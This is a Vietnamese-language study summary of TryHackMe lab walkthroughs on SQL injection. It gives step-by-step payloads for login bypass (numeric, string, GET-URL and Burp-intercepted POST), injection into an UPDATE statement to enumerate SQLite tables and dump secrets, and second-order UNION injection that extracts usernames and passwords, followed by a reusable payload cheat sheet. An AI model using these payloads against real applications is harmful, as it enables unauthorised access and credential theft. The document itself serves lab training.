# TỔNG HỢP CÁC BƯỚC TẤN CÔNG SQL INJECTION
## GIỚI THIỆU
Tài liệu này tổng hợp các bước tấn công SQL Injection trong 5 bài lab trên TryHackMe. Mỗi loại tấn công có đặc điểm và cách thực hiện khác nhau.

---

## 1. NON-STRING INJECTION
### Đặc điểm
Tham số là số nguyên
SQL viết: WHERE profileID = 10 (KHÔNG có dấu nháy)

### Các bước thực hiện
Bước 1: Truy cập http://IP:5000/sesqli1/
Bước 2: Nhập ProfileID: 1 or 1=1-- -
Bước 3: Nhập Password: (để trống)
Bước 4: Click Login
Bước 5: Lấy flag

### Payload
1 or 1=1-- -

---

## 2. STRING INJECTION

### Đặc điểm
Tham số là chuỗi
SQL viết: WHERE profileID = '10' (CÓ dấu nháy)

### Các bước thực hiện
Bước 1: Truy cập http://IP:5000/sesqli2/
Bước 2: Nhập ProfileID: 1' or '1'='1'-- -
Bước 3: Nhập Password: (để trống)
Bước 4: Click Login
Bước 5: Lấy flag

### Payload
1' or '1'='1'-- -

---

## 3. URL INJECTION
### Đặc điểm
Dùng phương thức GET
Có JavaScript chặn phía client
Dữ liệu trên URL

### Các bước thực hiện
Bước 1: Truy cập http://IP:5000/sesqli3/
Bước 2: Lấy URL gốc: http://IP:5000/sesqli3/login?profileID=10\&password=abc
Bước 3: Sửa URL thành: http://IP:5000/sesqli3/login?profileID=-1' or 1=1-- -\&password=a
Bước 4: Hoặc dùng URL mã hóa: http://IP:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-\&password=a
Bước 5: Enter và lấy flag

### Payload
URL gốc:
http://IP:5000/sesqli3/login?profileID=10\&password=abc

URL tấn công:
http://IP:5000/sesqli3/login?profileID=-1' or 1=1-- -\&password=a

URL mã hóa:
http://IP:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-\&password=a

---

## 4. POST INJECTION

### Đặc điểm
Dùng phương thức POST
Có JavaScript chặn phía client
Dữ liệu trong body request


### Các bước thực hiện
Bước 1: Mở Burp Suite và bật Intercept
Bước 2: Truy cập http://IP:5000/sesqli4/
Bước 3: Nhập ProfileID: 10, Password: abc
Bước 4: Click Login để Burp bắt request
Bước 5: Sửa request: profileID=1' or '1'='1'-- -\&password=a
Bước 6: Forward để gửi request
Bước 7: Lấy flag

### Payload
POST /sesqli4/login HTTP/1.1
Host: IP:5000
profileID=1' or '1'='1'-- -\&password=a

---

## 5. UPDATE STATEMENT

### Đặc điểm
Tấn công vào câu lệnh UPDATE
Có thể đổi mật khẩu không cần biết pass cũ

### Các bước thực hiện
Bước 1: Đăng nhập với profileID=10, password=toor
Bước 2: Vào Edit Profile
Bước 3: Xác nhận lỗ hổng: asd',nickName='test',email='hacked
Bước 4: Xác định database: ',nickName=sqlite\_version(),email='
Bước 5: Liệt kê bảng: ',nickName=(SELECT group\_concat(tbl\_name) FROM sqlite\_master WHERE type='table' and tbl\_name NOT like 'sqlite\_%'),email='
Bước 6: Liệt kê cột: ',nickName=(SELECT sql FROM sqlite\_master WHERE type!='meta' AND sql NOT NULL AND name='secrets'),email='
Bước 7: Dump dữ liệu: ',nickName=(SELECT group\_concat(secret) FROM secrets),email='
Bước 8: Lấy flag

### Các payload
Xác nhận lỗ hổng:
asd',nickName='test',email='hacked

Xác định database:
',nickName=sqlite\_version(),email='

Liệt kê bảng:
',nickName=(SELECT group\_concat(tbl\_name) FROM sqlite\_master WHERE type='table' and tbl\_name NOT like 'sqlite\_%'),email='

Liệt kê cột:
',nickName=(SELECT sql FROM sqlite\_master WHERE type!='meta' AND sql NOT NULL AND name='secrets'),email='

Dump dữ liệu:
',nickName=(SELECT group\_concat(secret) FROM secrets),email='

---

## 6. SECOND-ORDER INJECTION

### Đặc điểm
Injection xảy ra ở 2 bước
Đăng ký → Lưu payload → Vào Notes → Trigger injection

### Các bước thực hiện
Bước 1: Đăng ký user với payload: ' union select 1,2'
Bước 2: Đăng nhập với user vừa tạo
Bước 3: Vào Notes để xác định số cột
Bước 4: Đăng ký user mới để liệt kê bảng: ' union select group\_concat(tbl\_name) from sqlite\_master where type='table' and tbl\_name not like 'sqlite\_%',2'
Bước 5: Đăng nhập và vào Notes để xem bảng
Bước 6: Đăng ký user mới để dump dữ liệu: ' union select group\_concat(username || ':' || password),2 from users'
Bước 7: Đăng nhập và vào Notes để xem flag

### Các payload
Xác định số cột:
' union select 1,2'

Liệt kê bảng:
' union select group\_concat(tbl\_name) from sqlite\_master where type='table' and tbl\_name not like 'sqlite\_%',2'

Dump dữ liệu:
' union select group\_concat(username || ':' || password),2 from users'

---

## TỔNG KẾT PAYLOAD
### Bypass Login
Non-String: 1 or 1=1-- -
String: 1' or '1'='1'-- -
URL: -1' or 1=1-- -
POST: 1' or '1'='1'-- -

### Enumeration
Xác định database (SQLite): ',nickName=sqlite\_version(),email='
Liệt kê bảng (SQLite): ',nickName=(SELECT group\_concat(tbl\_name) FROM sqlite\_master WHERE type='table' and tbl\_name NOT like 'sqlite\_%'),email='
Liệt kê cột (SQLite): ',nickName=(SELECT sql FROM sqlite\_master WHERE type!='meta' AND sql NOT NULL AND name='TÊN\_BẢNG'),email='
Dump dữ liệu (SQLite): ',nickName=(SELECT group\_concat(TÊN\_CỘT) FROM TÊN\_BẢNG),email='

### Second-Order
Xác định số cột: ' union select 1,2'
Liệt kê bảng: ' union select group\_concat(tbl\_name) from sqlite\_master where type='table' and tbl\_name not like 'sqlite\_%',2'
Dump dữ liệu: ' union select group\_concat(username || ':' || password),2 from users'

---

## QUY TRÌNH CHUNG
1. Xác định loại injection (String/Non-String)
2. Thử payload cơ bản để bypass login
3. Nếu dùng UNION, xác định số cột
4. Xác định database (MySQL/SQLite)
5. Liệt kê bảng
6. Liệt kê cột
7. Dump dữ liệu

---
## LƯU Ý QUAN TRỌNG
String cần dấu nháy, Non-String không cần dấu nháy
Dùng -- - hoặc # để chú thích phần còn lại
UNION yêu cầu số cột phải khớp với truy vấn gốc
SQLite dùng sqlite\_master, MySQL dùng information\_schema
Client-side validation (JavaScript) KHÔNG phải là bảo mật
Có thể đổi mật khẩu mà không cần biết mật khẩu cũ

---



